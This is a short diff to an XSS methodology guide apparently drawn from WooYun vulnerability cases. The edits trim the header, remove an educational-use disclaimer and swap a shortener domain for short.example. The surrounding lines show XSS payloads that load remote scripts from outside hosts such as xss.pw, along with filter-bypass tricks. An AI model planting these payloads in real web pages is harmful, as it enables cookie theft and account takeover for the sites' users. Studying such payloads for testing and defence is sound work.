@@ -1,8 +1,6 @@
 # XSS Vulnerability Analysis Methodology
 
-> In-depth distillation based on 7,532 XSS vulnerability cases from WooYun, covering identification, testing, bypass, and exploitation of Stored/Reflected/DOM-based XSS
->
-> **Disclaimer**: This document is intended solely for security research, vulnerability analysis, and defensive learning. All payload examples are for educational purposes only.
+> Distilled from 7,532 cases | Data source: WooYun Vulnerability Database (2010-2016)
 
 ---
 
@@ -341,7 +339,7 @@ src=//xss.com/x.js>               <!-- Newline replacing space -->
 <script src=//xss.pw/j>
 
 <!-- Combined with short domains -->
-<script src=//t.cn/xxx>
+<script src=//short.example/xxx>
 ```
 
 #### 4.5.2 Segmented Injection
